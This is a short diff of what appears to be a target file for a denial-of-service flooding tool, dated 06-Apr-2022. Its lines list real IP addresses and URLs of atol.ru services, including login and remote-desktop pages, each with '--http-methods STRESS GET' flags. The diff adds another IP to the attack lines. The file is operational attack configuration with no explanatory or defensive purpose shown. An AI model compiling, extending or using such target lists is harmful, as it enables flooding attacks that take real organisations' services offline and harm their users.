@@ -1,5 +1,5 @@
 #targets updated 06-Apr-2022 
 
-http://185.71.67.137:80 http://185.31.134.104:80 http://185.31.134.103:80 --http-methods STRESS GET 
+http://185.71.67.137:80 http://185.31.134.104:80 http://185.31.134.103:80 http://178.57.71.203:80 --http-methods STRESS GET 
 https://ac.atol.ru https://lk.atol.ru/#/auth/login https://uc.atol.ru/login/index.php https://term.atol.ru/RDWeb/webclient/index.html https://www.atol.ru https://online.atol.ru https://atol.online --http-methods STRESS GET 
-https://185.71.67.137:443 https://185.31.134.104:443 https://185.31.134.103:443 --http-methods STRESS GET 
+https://185.71.67.137:443 https://185.31.134.104:443 https://185.31.134.103:443 https://178.57.71.203:443 --http-methods STRESS GET 
